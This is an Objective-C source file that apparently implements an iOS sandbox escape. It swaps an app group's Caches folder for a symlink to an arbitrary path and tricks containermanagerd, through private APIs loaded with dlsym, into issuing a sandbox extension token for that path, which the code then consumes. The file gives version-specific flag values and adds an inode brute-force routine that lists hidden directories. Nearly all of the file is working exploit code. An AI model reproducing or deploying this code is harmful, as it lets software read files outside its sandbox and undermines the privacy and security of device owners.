// Wq.m - worse_query port (forcequitOS/worse_query, GPL-3.0) plus pathleak.
//
// Mechanism: point <appGroup>/Library/Caches at the target path, then let
// containermanagerd resolve that container part and hand back a sandbox token.
// The symlink is what it resolves, so the token covers the target.

#import "Wq.h"

#import <dirent.h>
#import <dlfcn.h>
#import <sys/fsgetpath.h>
#import <sys/mount.h>
#import <sys/stat.h>
#import <unistd.h>

typedef void *(*container_query_create_fn)(void);
typedef void (*container_query_set_class_fn)(void *, uint64_t);
typedef void (*container_query_set_identifiers_fn)(void *, xpc_object_t);
typedef void (*container_query_set_flags_fn)(void *, uint64_t);
typedef void (*container_query_set_part_fn)(void *, uint64_t);
typedef void *(*container_query_get_single_result_fn)(void *);
typedef void (*container_query_free_fn)(void *);
typedef char *(*container_copy_sandbox_token_fn)(void *);
typedef int64_t (*sandbox_extension_consume_fn)(const char *);
typedef int (*sandbox_extension_release_fn)(int64_t);

static void WQCleanSymlink(NSString *group) {
    if (group == nil) return;
    NSFileManager *files = [NSFileManager defaultManager];
    NSURL *root = [files containerURLForSecurityApplicationGroupIdentifier:group];
    if (root == nil) return;
    NSURL *caches = [root URLByAppendingPathComponent:@"Library/Caches"];
    [files removeItemAtURL:caches error:nil];
    [files createDirectoryAtURL:caches withIntermediateDirectories:NO attributes:nil error:nil];
}

int64_t WQAccessEx(NSString *path, NSString *group, uint64_t flags, uint64_t part) {
    if (path.length == 0) return -255;

    NSFileManager *files = [NSFileManager defaultManager];
    NSURL *root = [files containerURLForSecurityApplicationGroupIdentifier:group];
    if (root == nil) return -1;

    NSString *caches = [[root URLByAppendingPathComponent:@"Library/Caches"] path];

    void *mgr = dlopen("/usr/lib/system/libsystem_containermanager.dylib",
                       RTLD_NOW | RTLD_LOCAL);
    if (mgr == NULL) return -2;

    container_query_create_fn qCreate =
        (container_query_create_fn)dlsym(mgr, "container_query_create");
    container_query_set_class_fn qSetClass =
        (container_query_set_class_fn)dlsym(mgr, "container_query_set_class");
    container_query_set_identifiers_fn qSetGroups =
        (container_query_set_identifiers_fn)dlsym(mgr, "container_query_set_group_identifiers");
    container_query_set_flags_fn qSetFlags =
        (container_query_set_flags_fn)dlsym(mgr, "container_query_operation_set_flags");
    container_query_set_part_fn qSetPart =
        (container_query_set_part_fn)dlsym(mgr, "container_query_operation_set_part");
    container_query_get_single_result_fn qResult =
        (container_query_get_single_result_fn)dlsym(mgr, "container_query_get_single_result");
    container_query_free_fn qFree =
        (container_query_free_fn)dlsym(mgr, "container_query_free");
    container_copy_sandbox_token_fn qToken =
        (container_copy_sandbox_token_fn)dlsym(mgr, "container_copy_sandbox_token");
    sandbox_extension_consume_fn consume =
        (sandbox_extension_consume_fn)dlsym(RTLD_DEFAULT, "sandbox_extension_consume");

    if (!qCreate || !qSetClass || !qSetGroups || !qSetFlags || !qSetPart ||
        !qResult || !qFree || !qToken || !consume) {
        dlclose(mgr);
        return -2;
    }

    void *query = qCreate();
    if (query == NULL) { dlclose(mgr); return -3; }

    qSetClass(query, 7);                              // app group class
    xpc_object_t ident = xpc_string_create(group.UTF8String);
    qSetGroups(query, ident);
    qSetPart(query, part);
    qSetFlags(query, flags);

    [files removeItemAtPath:caches error:nil];
    if (![files createSymbolicLinkAtPath:caches
                     withDestinationPath:path
                                   error:nil]) {
        dlclose(mgr);
        return -4;
    }

    void *result = qResult(query);
    if (result == NULL) {
        qFree(query);
        dlclose(mgr);
        WQCleanSymlink(group);
        return -5;
    }

    char *token = qToken(result);
    if (token == NULL) {
        qFree(query);
        dlclose(mgr);
        WQCleanSymlink(group);
        return -6;
    }

    int64_t handle = consume(token);
    qFree(query);
    free(token);
    dlclose(mgr);
    WQCleanSymlink(group);
    return handle;
}

int64_t WQAccess(NSString *path, NSString *group, int mode) {
    // Upstream constants: iOS 27 uses 0x0000008000000000, iOS 26.x needs
    // 0x0000000800000000. Anything else makes containermanagerd return a result
    // whose token array is malformed, and copy_sandbox_token traps in libxpc.
    const uint64_t flags = mode ? 0x0000000800000000ULL : 0x0000008000000000ULL;
    return WQAccessEx(path, group, flags, 3);
}

void WQRelease(int64_t handle) {
    if (handle < 0) return;
    sandbox_extension_release_fn release =
        (sandbox_extension_release_fn)dlsym(RTLD_DEFAULT, "sandbox_extension_release");
    if (release != NULL) release(handle);
}

NSArray<NSString *> *WQList(NSString *dir, unsigned long long maxInode) {
    if (dir.length == 0 || maxInode < 1) return @[];

    NSString *trimmed = dir;
    while (trimmed.length > 1 && [trimmed hasSuffix:@"/"]) {
        trimmed = [trimmed substringToIndex:trimmed.length - 1];
    }

    struct statfs sfs;
    if (statfs(trimmed.fileSystemRepresentation, &sfs) != 0) return @[];
    fsid_t fsid = sfs.f_fsid;

    char prefix[PATH_MAX];
    if (![trimmed getFileSystemRepresentation:prefix maxLength:sizeof(prefix)]) return @[];
    size_t prefixLength = strlen(prefix);
    if (prefixLength == 1 && prefix[0] == '/') prefixLength = 0;

    NSMutableArray<NSString *> *out = [NSMutableArray array];
    char buffer[PATH_MAX];
    for (unsigned long long inode = 1; inode <= maxInode; inode++) {
        ssize_t n = fsgetpath(buffer, sizeof(buffer), &fsid, inode);
        if (n <= 0) continue;
        if (strncmp(buffer, prefix, prefixLength) != 0) continue;
        if (buffer[prefixLength] != '/') continue;
        if (strchr(buffer + prefixLength + 1, '/') != NULL) continue;

        NSString *s = [NSString stringWithUTF8String:buffer];
        if (s.length > 0) [out addObject:s];
    }
    return out;
}

NSArray<NSString *> *WQEntries(NSString *dir, unsigned long long maxInode) {
    NSMutableArray<NSString *> *names = [NSMutableArray array];

    DIR *dp = opendir(dir.fileSystemRepresentation);
    if (dp != NULL) {
        struct dirent *de;
        while ((de = readdir(dp)) != NULL) {
            NSString *n = [NSString stringWithUTF8String:de->d_name];
            if (n.length == 0 || [n isEqualToString:@"."] || [n isEqualToString:@".."]) continue;
            [names addObject:n];
        }
        closedir(dp);
    }

    if (names.count == 0) {
        for (NSString *p in WQList(dir, maxInode)) {
            [names addObject:p.lastPathComponent];
        }
    }

    return [names sortedArrayUsingSelector:@selector(compare:)];
}
